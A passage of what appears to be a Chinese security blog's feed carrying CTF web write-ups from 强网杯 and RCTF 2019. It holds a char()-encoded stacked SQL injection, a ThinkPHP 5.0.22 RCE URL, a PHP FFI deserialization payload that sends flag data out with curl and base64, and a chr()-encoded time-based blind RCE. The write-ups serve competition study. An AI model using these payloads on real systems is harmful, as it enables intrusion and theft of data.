@s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(103),char(114),char(111),char(117),char(112),char(95),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(67),char(79),char(76),char(85),char(77),char(78),char(95),char(78),char(65),char(77),char(69),char(41),char(32),char(102),char(114),char(111),char(109),char(32),char(105),char(110),char(102),char(111),char(114),char(109),char(97),char(116),char(105),char(111),char(110),char(95),char(115),char(99),char(104),char(101),char(109),char(97),char(46),char(67),char(79),char(76),char(85),char(77),char(78),char(83),char(32),char(119),char(104),char(101),char(114),char(101),char(32),char(84),char(65),char(66),char(76),char(69),char(95),char(78),char(65),char(77),char(69),char(61),char(39),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(39));PREPARE a FROM @s;EXECUTE a;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-26-18-21-01.png" alt=""><br>getflag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos;;set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(102),char(108),char(97),char(103),char(32),char(102),char(114),char(111),char(109),char(32),char(96),char(49),char(57),char(49),char(57),char(56),char(49),char(48),char(57),char(51),char(49),char(49),char(49),char(52),char(53),char(49),char(52),char(96));PREPARE a FROM @s;EXECUTE a;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-26-18-21-44.png" alt=""></p><h2 id="强网先锋-上单"><a href="#强网先锋-上单" class="headerlink" title="强网先锋-上单"></a>强网先锋-上单</h2><p>据说是道送分题= =<br>访问题目，得到目录<br><img src="/images/2019-05-26-18-22-41.png" alt=""><br>发现信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.66.242:31392/1/public/</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-26-18-22-58.png" alt=""><br>得知是用thinkphp 5.0.22开发，随手搜索，发现RCE CVE：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.66.242:31392/1/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</span><br></pre></td></tr></table></figure></p><p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f869fa995fb99667e75e04b5c3ca77cc&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于跳跳糖</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;upload&quot;&gt;&lt;a href=&quot;#upload&quot; class=&quot;headerlink&quot; title=&quot;upload&quot;&gt;&lt;/a&gt;upload&lt;/h2&gt;&lt;p&gt;登入题目，首先纵览题目功能，发现有注册和登录：&lt;br&gt;&lt;img src=&quot;/images/2019-05-2
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 RCTF Web Writeup</title>
    <link href="http://skysec.top/2019/05/18/2019-RCTF-Web-Writeup/"/>
    <id>http://skysec.top/2019/05/18/2019-RCTF-Web-Writeup/</id>
    <published>2019-05-18T12:39:29.000Z</published>
    <updated>2019-07-02T14:15:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本坑开的好久了= =，但一直太忙了，现在已经是7月了，都想不起来还有啥题了，只把坑先填上了~</p><h2 id="nextphp"><a href="#nextphp" class="headerlink" title="nextphp"></a>nextphp</h2><p>拿到题目<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line">        <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>列目录查看一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=var_dump(scandir(%27.%27));</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; [3]=&gt; string(11) &quot;preload.php&quot; &#125;</span><br></pre></td></tr></table></figure></p><p>发现存在preload.php页面，尝试读源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="keyword">Exception</span>(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>尝试查看限制，读取phpinfo()，发现open_basedir限制：<br><img src="/images/2019-05-18-20-47-09.png" alt=""><br>发现disable_functions限制：<br><img src="/images/2019-05-18-20-47-22.png" alt=""><br>基本可以确定，又是一个bypass open_basedir和disable_functions的题目。<br>有了之前0ctf和*ctf的参考，我可以基本确定，这道题应该有某些拓展或者文件可以利用，否则很难达到目标，那么preload就是一个突破口，可以得知:<br><img src="/images/2019-05-21-13-35-19.png" alt=""><br>同时发现题目是php7.4，开启FFI扩展：<br><img src="/images/2019-05-18-20-40-09.png" alt=""><br>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。<br>FFI的使用非常简单，只用声明和调用两步就可以，对于有C语言经验，但是不了解Zend引擎的程序员来说，这简直是打开了新世界的大门，可以快速地使用C类库进行原型试验。<br>php样例如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// create FFI object, loading libc and exporting function printf()</span></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    <span class="string">"int printf(const char *format, ...);"</span>, <span class="comment">// this is a regular C declaration</span></span><br><span class="line">    <span class="string">"libc.so.6"</span>);</span><br><span class="line"><span class="comment">// call C's printf()</span></span><br><span class="line">$ffi-&gt;printf(<span class="string">"Hello %s!\n"</span>, <span class="string">"world"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>可以发现FFI，可以直接调用底层c的函数执行命令，我们搜索一下：<br>printf对应的申明：<br><img src="/images/2019-05-18-21-30-01.png" alt=""><br>那么搜索system对应的申明:<br><img src="/images/2019-05-18-21-29-41.png" alt=""><br>将官方样例改写：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ffi = FFI::cdef(<span class="string">"int system (const char* command);"</span>);</span><br><span class="line">$ffi-&gt;system(<span class="string">"ls"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>利用序列化触发，构造序列化为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">➜ cat 1.php</span><br><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        &apos;ret&apos; =&gt; null,</span><br><span class="line">        &apos;func&apos; =&gt; &apos;FFI::cdef&apos;,</span><br><span class="line">        &apos;arg&apos; =&gt; &quot;int system (const char* command);&quot;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data = unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A;</span><br><span class="line">echo serialize($a);</span><br><span class="line">➜ php7.4 1.php</span><br><span class="line">C:1:&quot;A&quot;:96:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:33:&quot;int system (const char* command);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>得到序列化:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:1:&quot;A&quot;:96:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:33:&quot;int system (const char* command);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>尝试执行命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=$a=unserialize(&apos;C:1:&quot;A&quot;:96:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:33:&quot;int system (const char* command);&quot;;&#125;&#125;&apos;);var_dump($a-&gt;ret-&gt;system(&apos;ls&apos;));</span><br></pre></td></tr></table></figure></p><p>直接执行命令只返回<code>int(1792)</code>等，于是考虑用盲打，为了防止特殊字符，我们使用了Base64：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=$a=unserialize(&apos;C:1:&quot;A&quot;:96:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:33:&quot;int system (const char* command);&quot;;&#125;&#125;&apos;);var_dump($a-&gt;ret-&gt;system(&apos;curl ip:23333/`ls / | base64`&apos;));</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-18-21-21-15.png" alt=""><br><img src="/images/2019-05-18-21-29-00.png" alt=""><br>可以成功列目录，找到flag，继续读文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://nextphp.2019.rctf.rois.io/?a=$a=unserialize(&apos;C:1:&quot;A&quot;:96:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:33:&quot;int system (const char* command);&quot;;&#125;&#125;&apos;);var_dump($a-&gt;ret-&gt;system(&apos;curl ip:23333/`cat /flag | base64`&apos;));</span><br></pre></td></tr></table></figure></p><p>得到：<br><img src="/images/2019-05-18-21-21-59.png" alt=""><br><img src="/images/2019-05-18-21-23-46.png" alt=""></p><h2 id="calcalcalc"><a href="#calcalcalc" class="headerlink" title="calcalcalc"></a>calcalcalc</h2><h3 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h3><p>这是一道很有趣的题，题目使用了拟态的构想，使用了三种后端：nodejs、php、python<br>原理很清晰，我们input的参数，会分别进入3种后端进行执行，如果3种后端最后的返回值不同，那么则认定为无效，会做一些处理。如果返回值一致，认定为安全，则将执行结果返回。<br>我们简单测试一下：<br><img src="/images/2019-05-21-13-48-52.png" alt=""><br>当执行结果不同时，返回禁止事项：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">That&apos;s classified information. - Asahina Mikuru</span><br></pre></td></tr></table></figure></p><p>如果结果一致时：<br><img src="/images/2019-05-21-13-49-23.png" alt=""><br>则正常返回结果。</p><h3 id="后端分析"><a href="#后端分析" class="headerlink" title="后端分析"></a>后端分析</h3><p>题目给出了环境代码，我们简单看一下：<br>首先是python代码：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> bson</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __builtins__[<span class="string">'exec'</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate</span><span class="params">()</span>:</span></span><br><span class="line">    data = request.get_data()</span><br><span class="line">    expr = bson.BSON(data).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bson.BSON.encode(&#123;</span><br><span class="line">      <span class="string">"ret"</span>: str(eval(str(expr[<span class="string">'expression'</span>])))</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></p><p>其中做出了一些限制，例如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del __builtins__[&apos;exec&apos;]</span><br></pre></td></tr></table></figure></p><p>但其确实直接会eval参数<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> bson.BSON.encode(&#123;</span><br><span class="line">      <span class="string">"ret"</span>: str(eval(str(expr[<span class="string">'expression'</span>])))</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>除此之外还设置了timeout:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timeout = 1</span><br></pre></td></tr></table></figure></p><p>然后是php代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line">$input = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$options = MongoDB\BSON\toPHP($input);</span><br><span class="line">$ret = <span class="keyword">eval</span>(<span class="string">'return '</span> . (string) $options-&gt;expression . <span class="string">';'</span>);</span><br><span class="line"><span class="keyword">echo</span> MongoDB\BSON\fromPHP([<span class="string">'ret'</span> =&gt; (string) $ret]);</span><br></pre></td></tr></table></figure></p><p>我们发现其也会直接执行命令:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ret = <span class="keyword">eval</span>(<span class="string">'return '</span> . (string) $options-&gt;expression . <span class="string">';'</span>);</span><br><span class="line"><span class="keyword">echo</span> MongoDB\BSON\fromPHP([<span class="string">'ret'</span> =&gt; (string) $ret]);</span><br></pre></td></tr></table></figure></p><p>同时也设置了相关设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">disable_functions = set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log</span><br><span class="line">max_execution_time = 1</span><br></pre></td></tr></table></figure></p><p>最后是nodejs：<br>同样做出了时间限制和一些过滤：<br><img src="/images/2019-05-21-13-54-24.png" alt=""><br><img src="/images/2019-05-21-13-54-43.png" alt=""><br>并且也会直接执行参数：<br><img src="/images/2019-05-21-13-55-02.png" alt=""><br>简单对这3种后端做一个总结，都过滤了个别危险函数/库，都做了超时设定。都会直接eval输入的参数。</p><h3 id="攻击思考"><a href="#攻击思考" class="headerlink" title="攻击思考"></a>攻击思考</h3><p>看完后端，我的第一反应：每一个后端都是直接进行eval，并没有预执行，或者放在sandbox中执行，那如果我们的恶意参数输入，确实是先执行后，才比对结果，那么最多只会看不到回显而已，按照规则，只能得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">That&apos;s classified information. - Asahina Mikuru</span><br></pre></td></tr></table></figure></p><p>但我们的恶意代码确实已经执行了。顺着这一点，我尝试考虑数据外带，例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl ip:23333/`ls | base64`</span><br></pre></td></tr></table></figure></p><p>但是很遗憾：<br>从docker-compose.yml中可以看到，3台后端都在内网中，ip分别为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nodejs 10.0.20.11</span><br><span class="line">python 10.0.20.11</span><br><span class="line">php 10.0.20.11</span><br></pre></td></tr></table></figure></p><p>我们并不能外带数据。那么有没有什么其他方式可以获取命令执行的数据呢？<br>这里可以参考我之前写过的一篇文章：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2017/12/29/Time-Based-RCE/</span><br></pre></td></tr></table></figure></p><p>这篇文章介绍了2种外带数据的方法，第一种就是前面所说，利用curl / ping的方式，而第二种，则是本次用到的方式，即Time Based Rce。<br>想必大家都对sql盲注耳熟能详，其中有一种类型的注入叫做基于时间的sql注入，其原理是因为无论攻击者如何测试，网页回显永远保持一致，而攻击者只能通过时间来判断自己的结果是否成功。<br>对于这里的情况正好符合需求，因为我们无法得到命令执行回显，但可以得到网页执行的时间。<br>简单思考一下，前端做出的响应，一定是在3种后端都执行完毕后才进行响应。那么整个响应时间就会由3种后端，响应速度最慢的一个决定。那么我们是否可以只关注其中一个后端，让他的响应时间变为立即响应 / 延时5s响应，那么整个前端的时间就会变成立即响应 / 延时5s响应，那么我们就能通过前端的响应时间，来判断其中某个后端的执行结果是否成功。<br>但是这里我们遇到问题，不难发现，出题人在3个后端中都设置了超时1s的操作。<br>但是测试的时候，我惊奇的发现：<br><img src="/images/2019-05-21-14-10-58.png" alt=""><br>我可以通过sleep函数成功控制响应时间。随机我马上测试了一下，判断这是哪个后端产生的问题：<br>对于nodejs：<br><img src="/images/2019-05-21-14-12-03.png" alt=""><br>我们发现nodejs并没有sleep这种函数，那么问题一定是在python或者php上。<br>为了测试python,我构造了一个死循环：<br><img src="/images/2019-05-21-14-13-35.png" alt=""><br>我尝试将这个List不断扩大：list(range(10000000))，用以加大整个后端的执行时间，但是此时抛出了另一种回显：<br><img src="/images/2019-05-21-14-14-51.png" alt=""><br>随机我去查看代码，发现了还有另外的检验：<br><img src="/images/2019-05-21-14-48-08.png" alt=""><br><img src="/images/2019-05-21-14-49-05.png" alt=""><br>这里对长度做了校验，要求小于15.同时有正则需要进行bypass。<br>我们简单测试：<br>14个1时：<br><img src="/images/2019-05-21-14-49-54.png" alt=""><br>15个1时：<br><img src="/images/2019-05-21-14-50-02.png" alt=""><br>这里的长度限制极大阻碍了我们进行bypass，同时从正则来看，我们所拥有的只有字母、数字、加减乘除，这对我们进行命令执行，数据盲注产生了极大的阻碍。</p><h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>那么为了成功的进行数据外带，我们开始思考如何bypass长度限制，因为字符正则并不是非常严格，我们可以想办法进行bypass：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(args.object <span class="keyword">as</span> CalculateModel).isVip) &#123;</span><br><span class="line"><span class="keyword">if</span> (str.length &gt;= args.constraints[<span class="number">0</span>]) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们看到，只要<code>(args.object as CalculateModel).isVip</code>为true，即可不进入if操作。<br>我们跟进，发现isVip的值默认为false:<br><img src="/images/2019-05-21-15-13-10.png" alt=""><br>故此我们可以构造json数组如下：<br><img src="/images/2019-05-22-21-11-53.png" alt=""><br>可以看到400的Response已经回显正常，变为禁止事项。（至于为什么没有正常回显，是因为数字较大，三种执行体的结果不一致）<br>那么既然可以正常bypass长度限制了，那么我们可以进行正则bypass。想到正则中有加号，而加号在python里可以用于字符串拼接，那么不难想到chr()的拼接方式。我们首先测试exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ord(open(&quot;/flag&quot;).read()[0])==1) and set(1 for i in range(1000000000))</span><br></pre></td></tr></table></figure></p><p>如下测试我们发现：<br><img src="/images/2019-05-22-21-39-31.png" alt=""><br>当读取flag数据值不匹配时，不会进行set(1 for i in range(1000000000))，而当匹配后会正常执行。（但这里由于写的太大，所以并没有进行延时，而是直接报内存错误）<br>那么我们将range缩小一些：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(ord(open(&quot;/flag&quot;).read()[0])==1) and set(1 for i in range(10000000))</span><br></pre></td></tr></table></figure></p><p>再利用脚本将其转chr()：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">'''(open("/flag").read()[0]=='a') and set(1 for i in range(10000000))'''</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">res+=<span class="string">'chr(%s)+'</span>%ord(i)</span><br><span class="line"><span class="keyword">print</span> res[:<span class="number">-1</span>]</span><br></pre></td></tr></table></figure></p><p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(40)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(34)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(34)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(91)+chr(48)+chr(93)+chr(61)+chr(61)+chr(39)+chr(97)+chr(39)+chr(41)+chr(32)+chr(97)+chr(110)+chr(100)+chr(32)+chr(115)+chr(101)+chr(116)+chr(40)+chr(49)+chr(32)+chr(102)+chr(111)+chr(114)+chr(32)+chr(105)+chr(32)+chr(105)+chr(110)+chr(32)+chr(114)+chr(97)+chr(110)+chr(103)+chr(101)+chr(40)+chr(49)+chr(48)+chr(48)+chr(48)+chr(48)+chr(48)+chr(48)+chr(48)+chr(41)+chr(41)</span><br></pre></td></tr></table></figure></p><p>测试一下，在匹配失败时：<br><img src="/images/2019-05-22-21-50-20.png" alt=""><br>在成功时：<br><img src="/images/2019-05-22-21-49-16.png" alt=""><br>可以发现时间大致一致，那么这是为什么呢？按照正常情况下来说:<br><img src="/images/2019-05-23-19-25-16.png" alt=""><br>应该在条件满足情况下会延时1s，而条件成立时应该立刻反馈，时间小于1s。那么应该可以通过1s这个分界点，判断是否执行成功。那么为什么现在的时长这么大，并且非常接近呢？<br>这里想到应该是在后端nodejs crash导致的不稳定性，由于裁决器需要交互，而nodejs一直处于crash的状态，迟迟不进行response，导致整个页面加载时间很长。所以这里不难想到需要阻止node js的语法错误。<br>那么自然可以想到使用注释符，但是如何保证python也运行正常呢？<br>观察正则的符号，仅有<code>//</code>可用于注释，而<code>//</code>又刚好是python的除法，那么我们可以构造<br><figure class="highlight 